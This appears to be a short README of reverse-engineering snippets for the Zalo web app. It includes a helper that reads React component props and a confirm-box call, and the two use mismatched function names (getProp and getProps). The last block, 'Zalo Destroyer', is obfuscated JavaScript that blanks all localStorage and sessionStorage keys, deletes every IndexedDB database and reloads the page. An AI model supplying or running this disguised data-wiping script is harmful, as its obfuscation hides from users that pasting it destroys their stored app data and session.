# Zalo-Web-Reverse
## Get Props and react elements
```js
function getProp(m){
    for(let i of Object.keys(document.querySelector("#app>div"))){
        if(i.includes("__reactEventHandlers")&&document.querySelector("#app>div")[i].children){
            if(m){
                for(let p of document.querySelector("#app>div")[i].children.filter(n=>n)){
                    if(p._owner&&p._owner.stateNode[m]){
                        return p._owner.stateNode[m]
                    }
                }
            } else {
                return document.querySelector("#app>div")[i].children.filter(n=>n)
            }
        }
    }
}
```

## Simple Confirm Box
```js
getProps("confirm")("content", "title", function(answer){console.log(answer)})
```

## Zalo Destroyer
```js
function _0x5e70(_0x3c6c83,_0x1c87ce){const _0x3ca278=_0x3ca2();return _0x5e70=function(_0x5e706c,_0x2af6b4){_0x5e706c=_0x5e706c-0x1ce;let _0x1ce2e4=_0x3ca278[_0x5e706c];return _0x1ce2e4;},_0x5e70(_0x3c6c83,_0x1c87ce);}function _0x3ca2(){const _0x56f198=['forEach','402006hqfwxK','60jifCsF','databases','location','2050716lmXhED','18tLqAat','7Trfjea','104McQFqJ','22NqDFnh','2084616QXeSMb','91ePNqPH','191128FdHiEU','keys','82995HalNMS','135006LAofpV','1261008fSbiZR','reload','setItem','deleteDatabase'];_0x3ca2=function(){return _0x56f198;};return _0x3ca2();}(function(_0x715c61,_0x282e98){const _0x5eef15=_0x5e70,_0x2cc6bc=_0x715c61();while(!![]){try{const _0x1b7302=-parseInt(_0x5eef15(0x1ce))/0x1+-parseInt(_0x5eef15(0x1df))/0x2*(parseInt(_0x5eef15(0x1d1))/0x3)+parseInt(_0x5eef15(0x1de))/0x4*(-parseInt(_0x5eef15(0x1d0))/0x5)+-parseInt(_0x5eef15(0x1db))/0x6*(-parseInt(_0x5eef15(0x1dd))/0x7)+-parseInt(_0x5eef15(0x1e0))/0x8*(-parseInt(_0x5eef15(0x1dc))/0x9)+-parseInt(_0x5eef15(0x1d8))/0xa*(parseInt(_0x5eef15(0x1d7))/0xb)+-parseInt(_0x5eef15(0x1d2))/0xc*(-parseInt(_0x5eef15(0x1e1))/0xd);if(_0x1b7302===_0x282e98)break;else _0x2cc6bc['push'](_0x2cc6bc['shift']());}catch(_0x47bc3a){_0x2cc6bc['push'](_0x2cc6bc['shift']());}}}(_0x3ca2,0x3fd98),(function(){const _0x199c24=_0x5e70;for(let _0x1eee8 of Object[_0x199c24(0x1cf)](localStorage)){localStorage[_0x199c24(0x1d4)](_0x1eee8,'');};indexedDB[_0x199c24(0x1d9)]()['then'](_0x336a47=>_0x336a47[_0x199c24(0x1d6)](_0x55cb24=>indexedDB[_0x199c24(0x1d5)](_0x55cb24['name'])));for(let _0x354484 of Object['keys'](sessionStorage)){sessionStorage[_0x199c24(0x1d4)](_0x354484,''),window[_0x199c24(0x1da)][_0x199c24(0x1d3)]();}}()));
```
